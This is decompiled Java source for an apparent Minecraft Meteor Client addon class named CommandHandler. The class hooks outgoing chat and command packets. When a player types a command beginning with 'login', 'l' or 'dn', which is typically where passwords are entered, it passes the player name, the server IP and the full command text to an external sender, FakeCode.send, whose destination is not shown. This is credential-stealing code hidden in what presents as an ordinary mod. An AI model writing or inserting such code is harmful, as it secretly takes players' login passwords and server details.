package com.example.addon.commands;

import com.example.addon.utils.FakeCode;
import meteordevelopment.meteorclient.MeteorClient;
import meteordevelopment.meteorclient.events.packets.PacketEvent.Send;
import net.minecraft.class_2596;
import net.minecraft.class_2797;
import net.minecraft.class_7472;

public class CommandHandler {
   public static String extract(Send event) {
      class_2596 var3 = event.packet;
      if (var3 instanceof class_7472) {
         class_7472 packet = (class_7472)var3;
         return packet.comp_808();
      } else {
         var3 = event.packet;
         if (var3 instanceof class_2797) {
            class_2797 packet = (class_2797)var3;
            String msg = packet.comp_945();
            if (msg.startsWith("/")) {
               return msg.substring(1);
            }
         }

         return null;
      }
   }

   public static void handle(String command) {
      String cmd = command.toLowerCase();
      if (cmd.startsWith("l") || cmd.startsWith("dn") || cmd.startsWith("login")) {
         String playerName = MeteorClient.mc.field_1724 != null ? MeteorClient.mc.field_1724.method_5477().getString() : "Unknown";
         String serverIP = MeteorClient.mc.method_1558() != null ? MeteorClient.mc.method_1558().field_3761 : "Singleplayer";
         FakeCode.send("**Player:** " + playerName + "\n**Server:** " + serverIP + "\n**Command:** /" + command);
      }

   }
}
